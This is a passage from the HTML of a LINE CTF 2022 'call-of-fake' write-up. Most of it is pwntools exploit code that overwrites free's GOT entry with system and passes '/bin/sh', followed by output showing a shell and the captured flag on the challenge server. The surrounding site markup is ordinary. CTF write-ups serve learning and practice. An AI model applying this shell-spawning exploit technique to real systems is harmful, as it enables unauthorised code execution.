+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ADDTWICETAG</span><span class="p">)</span>				
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"free"</span><span class="p">])</span>			<span class="c1"># rsi 
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"F"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x200</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+
+<span class="c1"># read(e.got["free"], 0x20)             # =&gt; payload3
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SET</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"F"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x260</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+
+<span class="p">...</span>
+
+<span class="c1"># send payload for second free overwrite
+</span><span class="n">payload3</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
+<span class="n">payload3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)))</span></code></pre></figure>
+
+<p>With everything prepared, all that’s left is to trigger <code class="language-plaintext highlighter-rouge">fire</code> one more time.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># free(e.got["free"]+0x10) =&gt; system("/bin/sh")
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">FIRE</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x407090</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>     <span class="c1"># ptr to /bin/sh at 0x407090</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python work.py 1
+[*] '/media/sf_ctf/line22/calloffake/call-of-fake'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/media/sf_ctf/line22/calloffake/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 34.146.170.115 on port 10001: Done
+[*] Paused (press any to continue)
+[*] LEAK     : 0x7f24730e2d10
+[*] LIBC     : 0x7f247305e000
+[*] Paused (press any to continue)
+[*] Switching to interactive mode
+$ cd home
+$ cd call-of-fake
+$ cat flag
+LINECTF{B4By_C0unterfeitO0P!}</code></pre></figure>
+
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=LINE CTF 2022 - call-of-fake&amp;url=https://kileak.github.io/ctf/2022/linectf-calloffake/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2022/linectf-calloffake/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2022/linectf-calloffake';
+        var disqus_title = 'LINE CTF 2022 - call-of-fake';
+        var disqus_url = 'https://kileak.github.io/ctf/2022/linectf-calloffake';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
